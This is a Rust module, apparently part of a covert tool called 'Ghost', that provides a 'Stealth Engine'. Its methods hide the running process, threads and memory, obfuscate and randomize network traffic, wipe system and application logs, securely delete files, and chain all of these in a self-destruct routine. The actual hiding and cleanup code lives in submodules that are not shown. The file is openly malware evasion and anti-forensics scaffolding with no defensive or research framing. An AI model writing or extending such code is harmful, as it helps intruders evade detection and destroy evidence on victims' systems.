//! Stealth Engine - Ghost stays hidden
//!
//! Provides:
//! - Process hiding
//! - Memory hiding
//! - Traffic obfuscation
//! - Trace removal

mod hide;
mod obfuscate;
mod clean;

use anyhow::Result;
use std::path::PathBuf;

pub use hide::HidingEngine;
pub use obfuscate::ObfuscationEngine;
pub use clean::CleanupEngine;

/// Main stealth engine
pub struct StealthEngine {
    hiding: HidingEngine,
    obfuscation: ObfuscationEngine,
    cleanup: CleanupEngine,
    hidden_files: Vec<PathBuf>,
    stealth_level: StealthLevel,
}

#[derive(Debug, Clone, Copy)]
pub enum StealthLevel {
    Low,
    Medium,
    High,
    Maximum,
}

impl StealthEngine {
    pub fn new() -> Self {
        Self {
            hiding: HidingEngine::new(),
            obfuscation: ObfuscationEngine::new(),
            cleanup: CleanupEngine::new(),
            hidden_files: Vec::new(),
            stealth_level: StealthLevel::Maximum,
        }
    }

    pub fn with_level(mut self, level: StealthLevel) -> Self {
        self.stealth_level = level;
        self
    }

    /// Hide process
    pub fn hide_process(&self) -> Result<()> {
        match self.stealth_level {
            StealthLevel::Maximum | StealthLevel::High => {
                self.hiding.hide_process()?;
                self.hiding.hide_threads()?;
            }
            _ => {
                self.hiding.hide_process()?;
            }
        }
        Ok(())
    }

    /// Hide memory
    pub fn hide_memory(&self) -> Result<()> {
        match self.stealth_level {
            StealthLevel::Maximum => {
                self.hiding.hide_memory()?;
                self.hiding.encrypt_memory()?;
            }
            _ => {
                self.hiding.hide_memory()?;
            }
        }
        Ok(())
    }

    /// Obfuscate traffic
    pub fn obfuscate_traffic(&self) -> Result<()> {
        match self.stealth_level {
            StealthLevel::Maximum | StealthLevel::High => {
                self.obfuscation.obfuscate_traffic()?;
                self.obfuscation.randomize_timing()?;
            }
            _ => {
                self.obfuscation.obfuscate_traffic()?;
            }
        }
        Ok(())
    }

    /// Clean logs
    pub fn clean_logs(&self) -> Result<()> {
        match self.stealth_level {
            StealthLevel::Maximum | StealthLevel::High => {
                self.cleanup.clean_logs()?;
                self.cleanup.clean_application_logs()?;
            }
            _ => {
                self.cleanup.clean_logs()?;
            }
        }
        Ok(())
    }

    /// Clear memory
    pub fn clear_memory(&self) -> Result<()> {
        self.cleanup.clear_memory()?;
        Ok(())
    }

    /// Delete files
    pub fn delete_files(&self) -> Result<()> {
        for file in &self.hidden_files {
            if file.exists() {
                self.cleanup.secure_delete(file)?;
            }
        }
        Ok(())
    }

    /// Add file to cleanup list
    pub fn add_file_to_cleanup(&mut self, path: PathBuf) {
        self.hidden_files.push(path);
    }

    /// Self-destruct
    pub fn self_destruct(&self) -> Result<()> {
        self.hide_process()?;
        self.hide_memory()?;
        self.obfuscate_traffic()?;
        self.clean_logs()?;
        self.clear_memory()?;
        self.delete_files()?;
        Ok(())
    }
}